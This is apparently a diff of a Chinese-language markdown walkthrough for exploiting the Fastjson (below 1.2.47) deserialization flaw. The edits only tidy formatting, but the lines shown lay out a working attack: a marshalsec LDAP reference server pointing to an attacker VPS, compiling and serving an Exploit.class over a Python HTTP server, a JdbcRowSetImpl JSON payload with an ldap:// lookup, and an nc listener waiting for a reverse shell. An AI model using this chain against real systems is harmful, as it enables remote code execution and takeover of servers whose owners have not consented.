@@ -51,46 +51,40 @@ Fastjson \< 1.2.47
 
 -   执行：
 
-```{=html}
 <!-- -->
-```
+
     java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IPvps/#Exploit
 
-1.png
+> **图片待核**：原归档在此处仅保留文件名 `1.png`，没有可对应的图片引用。
 
 -   修改反弹ip和端口：
 
-```{=html}
 <!-- -->
-```
+
     vim Exploit.java
 
 -   编译生成class：//`需要使用jdk1.8，否则会报错`
 
-```{=html}
 <!-- -->
-```
+
     javac Exploit.java
 
 -   开启http服务：
 
-```{=html}
 <!-- -->
-```
+
     python3 -m http.server 80 或者 python -m SimpleHTTPServer 80
 
 -   payload:
 
-```{=html}
 <!-- -->
-```
+
     {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:1389/Exploit","autoCommit":true}}}
 
 -   开启nc监听反弹：
 
-```{=html}
 <!-- -->
-```
+
     nc -lvvp 8888
 
 ### 反弹shell poc补充
